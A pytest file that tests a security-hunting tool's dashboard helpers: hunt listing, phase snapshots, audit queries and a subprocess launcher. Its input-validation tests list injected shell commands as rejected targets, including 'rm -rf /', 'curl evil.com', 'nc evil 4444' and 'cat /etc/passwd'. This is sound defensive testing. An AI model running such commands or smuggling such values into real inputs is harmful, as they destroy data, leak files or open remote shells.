"""Tests for the Phase 4 dashboard /api/hack/* endpoints.

These read from a tmp SQLite DB populated via AuditLogger, then exercise
the three helper functions that the dashboard's HTTP handler calls:

  _hack_list_hunts(db_path, limit) → {hunts: [...]}
  _hack_hunt_snapshot(db_path, hunt_id) → phases + workers + findings
  _hack_audit_query(db_path, hunt_id, since, action, limit) → events

Calling the helpers directly (no live HTTP) keeps these tests fast +
deterministic and doesn't require the dashboard process to be running.
"""

from __future__ import annotations

import sys
import time
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from core.audit_logger import AuditLogger  # noqa: E402
from dashboard.server import (  # noqa: E402
    _hack_audit_query,
    _hack_hunt_snapshot,
    _hack_list_hunts,
    _hack_start_subprocess,
)


# ---------------------------------------------------------------------------
# fixture: build a hunt with realistic event shape
# ---------------------------------------------------------------------------


def _populate(db_path: Path, hunts_dir: Path, target: str = "example.com",
              ts_base: float = 1_700_000_000.0) -> str:
    """Create one hunt with phases + workers + findings."""
    log = AuditLogger.for_hunt(
        target, hunts_dir=hunts_dir, db_path=db_path, ts=ts_base,
    )
    hid = log.hunt_id
    log.event("hunt.started", target=target,
              payload={"profile": "lab"})
    log.event("loop.iteration", target=target, payload={"iteration": 1})
    # Recon phase
    log.event("phase.started", phase="recon", target=target)
    log.event("worker.dispatched", actor="recon_w1", phase="recon",
              target=target, payload={"technique": "subdomain"})
    log.event("worker.dispatched", actor="recon_w2", phase="recon",
              target=target, payload={"technique": "port_scan"})
    log.event("finding.published", phase="recon", target=target,
              severity="info",
              payload={"title": "api.example.com", "technique": "subdomain"})
    log.event("finding.published", phase="recon", target=target,
              severity="info",
              payload={"title": "80/tcp", "technique": "port_scan"})
    log.event("worker.completed", actor="recon_w1", phase="recon",
              target=target, duration_ms=42, outcome="success",
              findings_count=1, payload={"technique": "subdomain"})
    log.event("worker.completed", actor="recon_w2", phase="recon",
              target=target, duration_ms=88, outcome="success",
              findings_count=1, payload={"technique": "port_scan"})
    log.event("phase.completed", phase="recon", target=target,
              payload={"workers_completed": 2})
    # Vuln phase
    log.event("phase.started", phase="vuln", target=target)
    log.event("worker.dispatched", actor="vuln_w1", phase="vuln",
              target=target, payload={"technique": "sqli_probe"})
    log.event("finding.published", phase="vuln", target=target,
              severity="high",
              payload={"title": "SQLi candidate", "technique": "sqli_probe"})
    log.event("worker.failed", actor="vuln_w1", phase="vuln",
              target=target, duration_ms=120, outcome="failure")
    log.event("phase.completed", phase="vuln", target=target)
    log.event("hunt.completed", target=target, outcome="success",
              findings_count=3)
    log.close()
    return hid


# ---------------------------------------------------------------------------
# _hack_list_hunts
# ---------------------------------------------------------------------------


class TestListHunts:
    def test_returns_empty_when_db_missing(self, tmp_path):
        result = _hack_list_hunts(str(tmp_path / "nonexistent.db"), 50)
        assert result == {"hunts": []}

    def test_returns_empty_when_no_audit_table(self, tmp_path):
        import sqlite3
        db = tmp_path / "empty.db"
        sqlite3.connect(str(db)).close()  # touch
        result = _hack_list_hunts(str(db), 50)
        assert result == {"hunts": []}

    def test_returns_one_hunt(self, tmp_path):
        db = tmp_path / "v.db"
        hd = tmp_path / "hunts"
        hid = _populate(db, hd)
        result = _hack_list_hunts(str(db), 50)
        hunts = result["hunts"]
        assert len(hunts) == 1
        h = hunts[0]
        assert h["hunt_id"] == hid
        assert h["event_count"] >= 12
        # 3 findings published in the fixture
        assert h["finding_count"] == 3
        assert h["target"] == "example.com"
        # started_at <= last_event_at
        assert h["started_at"] <= h["last_event_at"]

    def test_orders_by_most_recent_first(self, tmp_path):
        db = tmp_path / "v.db"
        hd = tmp_path / "hunts"
        _populate(db, hd, target="older.com", ts_base=1_700_000_000.0)
        _populate(db, hd, target="newer.com", ts_base=1_700_000_500.0)
        result = _hack_list_hunts(str(db), 50)
        # Most recent first
        assert result["hunts"][0]["target"] == "newer.com"
        assert result["hunts"][1]["target"] == "older.com"

    def test_respects_limit(self, tmp_path):
        db = tmp_path / "v.db"
        hd = tmp_path / "hunts"
        for i in range(5):
            _populate(db, hd, target=f"t{i}.com",
                       ts_base=1_700_000_000.0 + i * 100)
        result = _hack_list_hunts(str(db), 3)
        assert len(result["hunts"]) == 3


# ---------------------------------------------------------------------------
# _hack_hunt_snapshot
# ---------------------------------------------------------------------------


class TestHuntSnapshot:
    def test_missing_db_returns_not_found(self, tmp_path):
        result = _hack_hunt_snapshot(str(tmp_path / "nope.db"), "fake")
        assert result == {"hunt_id": "fake", "found": False}

    def test_missing_hunt_id_empty_payload(self, tmp_path):
        db = tmp_path / "v.db"
        hd = tmp_path / "hunts"
        _populate(db, hd)
        result = _hack_hunt_snapshot(str(db), "totally_unknown_hunt")
        # found=True since DB exists, but phases/workers/findings are empty
        assert result["found"] is True
        assert result["phases"] == []
        assert result["workers"] == []
        assert result["findings"] == []

    def test_full_snapshot_shape(self, tmp_path):
        db = tmp_path / "v.db"
        hd = tmp_path / "hunts"
        hid = _populate(db, hd)
        result = _hack_hunt_snapshot(str(db), hid)
        assert result["found"] is True
        # Two phases recorded (recon + vuln)
        phases = result["phases"]
        phase_names = {p["phase"] for p in phases}
        assert phase_names == {"recon", "vuln"}
        # Worker counts per phase
        recon = next(p for p in phases if p["phase"] == "recon")
        assert recon["workers_dispatched"] == 2
        assert recon["workers_completed"] == 2
        assert recon["findings_count"] == 2
        vuln = next(p for p in phases if p["phase"] == "vuln")
        assert vuln["workers_failed"] == 1
        assert vuln["findings_count"] == 1
        # Workers list
        worker_ids = {w["worker_id"] for w in result["workers"]}
        assert worker_ids == {"recon_w1", "recon_w2", "vuln_w1"}
        # Findings list — 3 total, payloads parsed
        assert len(result["findings"]) == 3
        for f in result["findings"]:
            assert "payload" in f
            assert isinstance(f["payload"], dict)
        # Severity preserved
        severities = [f["severity"] for f in result["findings"]]
        assert "high" in severities  # vuln finding
        assert severities.count("info") == 2  # recon findings


# ---------------------------------------------------------------------------
# _hack_audit_query
# ---------------------------------------------------------------------------


class TestAuditQuery:
    def test_missing_db_returns_empty(self, tmp_path):
        result = _hack_audit_query(
            str(tmp_path / "nope.db"), "fake",
            since=0, action="", limit=100,
        )
        assert result == {"hunt_id": "fake", "events": []}

    def test_returns_all_events_for_hunt(self, tmp_path):
        db = tmp_path / "v.db"
        hd = tmp_path / "hunts"
        hid = _populate(db, hd)
        result = _hack_audit_query(
            str(db), hid, since=0, action="", limit=1000,
        )
        # All 13 events seeded
        assert result["count"] >= 13
        assert all(e["hunt_id"] == hid for e in result["events"])
        # Events ordered by timestamp
        timestamps = [e["ts"] for e in result["events"]]
        assert timestamps == sorted(timestamps)

    def test_filter_by_action(self, tmp_path):
        db = tmp_path / "v.db"
        hd = tmp_path / "hunts"
        hid = _populate(db, hd)
        result = _hack_audit_query(
            str(db), hid, since=0, action="finding.published", limit=100,
        )
        # Exactly 3 finding events
        assert result["count"] == 3
        assert all(e["action"] == "finding.published" for e in result["events"])
        # Payloads parsed from JSON
        assert all("payload" in e for e in result["events"])

    def test_since_filter(self, tmp_path):
        db = tmp_path / "v.db"
        hd = tmp_path / "hunts"
        hid = _populate(db, hd)
        # Pick a mid-stream timestamp
        full = _hack_audit_query(str(db), hid, since=0, action="", limit=1000)
        mid_ts = full["events"][5]["ts"]
        partial = _hack_audit_query(
            str(db), hid, since=mid_ts, action="", limit=1000,
        )
        # All returned events have ts >= mid_ts
        assert all(e["ts"] >= mid_ts for e in partial["events"])
        # Total count is less than full
        assert partial["count"] < full["count"]

    def test_respects_limit(self, tmp_path):
        db = tmp_path / "v.db"
        hd = tmp_path / "hunts"
        hid = _populate(db, hd)
        result = _hack_audit_query(
            str(db), hid, since=0, action="", limit=2,
        )
        assert result["count"] == 2

    def test_isolates_hunts(self, tmp_path):
        db = tmp_path / "v.db"
        hd = tmp_path / "hunts"
        hid_a = _populate(db, hd, target="a.com", ts_base=1_700_000_000)
        hid_b = _populate(db, hd, target="b.com", ts_base=1_700_001_000)
        result = _hack_audit_query(str(db), hid_a, since=0, action="",
                                     limit=1000)
        # Only hunt_a events
        assert all(e["hunt_id"] == hid_a for e in result["events"])
        # And not empty
        assert result["count"] > 0


# ---------------------------------------------------------------------------
# _hack_start_subprocess — POST /api/hack/start handler
# ---------------------------------------------------------------------------


class TestStartSubprocess:
    """These tests validate input WITHOUT actually spawning processes
    (validation rejects the input before subprocess.Popen is called)."""

    def test_empty_input_rejected(self):
        result = _hack_start_subprocess({})
        assert result["ok"] is False
        assert "target" in result["error"]

    def test_shell_metacharacter_target_rejected(self):
        for bad in (
            "example.com; rm -rf /",
            "example.com && curl evil.com",
            "example.com | nc evil 4444",
            "example.com`whoami`",
            "example.com\nrm -rf",
            "example.com$(whoami)",
            "example.com\"; cat /etc/passwd",
        ):
            r = _hack_start_subprocess({"target": bad})
            assert r["ok"] is False, f"unsafe target accepted: {bad!r}"
            assert "disallowed" in r["error"]

    def test_legit_targets_accepted_into_argv(self, monkeypatch):
        """Use a Popen mock so we capture the argv without spawning."""
        captured: dict = {}

        class _FakePopen:
            def __init__(self, argv, **kw):
                captured["argv"] = argv
                self.pid = 4242

        import subprocess
        monkeypatch.setattr(subprocess, "Popen", _FakePopen)
        result = _hack_start_subprocess({
            "target": "http://127.0.0.1:9999",
            "profile": "lab",
            "go": True,
            "time": 5,
            "workers": 16,
        })
        assert result["ok"] is True
        assert result["pid"] == 4242
        # the launcher returns a hunt_id + target so the UI can track + show the
        # hunt's live findings (the dashboard scan -> results flow).
        from core.audit_logger import make_hunt_id
        slug = make_hunt_id("http://127.0.0.1:9999").rsplit("_", 1)[0]  # ts may drift 1s
        assert result["hunt_id"].startswith(slug)
        assert result["target"] == "http://127.0.0.1:9999"
        # argv contains our flags
        argv = captured["argv"]
        assert "hack" in argv
        assert "http://127.0.0.1:9999" in argv
        assert "--profile" in argv and "lab" in argv
        assert "--go" in argv
        assert "--time" in argv and "5" in argv
        assert "--workers" in argv and "16" in argv
        assert "--quiet" in argv  # dashboard always passes --quiet

    def test_resume_path(self, monkeypatch):
        captured: dict = {}

        class _FakePopen:
            def __init__(self, argv, **kw):
                captured["argv"] = argv
                self.pid = 99

        import subprocess
        monkeypatch.setattr(subprocess, "Popen", _FakePopen)
        r = _hack_start_subprocess({"resume": "http_127.0.0.1_9999_1778"})
        assert r["ok"] is True
        argv = captured["argv"]
        assert "--resume" in argv
        assert "http_127.0.0.1_9999_1778" in argv

    def test_malformed_resume_rejected(self):
        r = _hack_start_subprocess({"resume": "evil; rm -rf /"})
        assert r["ok"] is False
        assert "malformed" in r["error"]

    def test_invalid_profile_silently_dropped(self, monkeypatch):
        captured: dict = {}

        class _FakePopen:
            def __init__(self, argv, **kw):
                captured["argv"] = argv
                self.pid = 1

        import subprocess
        monkeypatch.setattr(subprocess, "Popen", _FakePopen)
        r = _hack_start_subprocess({
            "target": "example.com", "profile": "exotic",
        })
        # Invalid profile is dropped from argv (no error) — argparse
        # would later reject it but the launcher is lenient
        assert r["ok"] is True
        assert "exotic" not in captured["argv"]
        assert "--profile" not in captured["argv"]

    def test_non_int_time_ignored(self, monkeypatch):
        captured: dict = {}

        class _FakePopen:
            def __init__(self, argv, **kw):
                captured["argv"] = argv
                self.pid = 1

        import subprocess
        monkeypatch.setattr(subprocess, "Popen", _FakePopen)
        r = _hack_start_subprocess({
            "target": "example.com", "time": "five minutes",
        })
        assert r["ok"] is True
        assert "--time" not in captured["argv"]

    def test_command_preview_returned(self, monkeypatch):
        class _FakePopen:
            def __init__(self, argv, **kw):
                self.pid = 1
        import subprocess
        monkeypatch.setattr(subprocess, "Popen", _FakePopen)
        r = _hack_start_subprocess({"target": "example.com", "go": True})
        assert "command_preview" in r
        # Preview shows the flags so the operator can verify
        assert "hack" in r["command_preview"]
        assert "example.com" in r["command_preview"]
        assert "--go" in r["command_preview"]
        # And doesn't include the bare python interpreter path
        assert "python" not in r["command_preview"].lower()
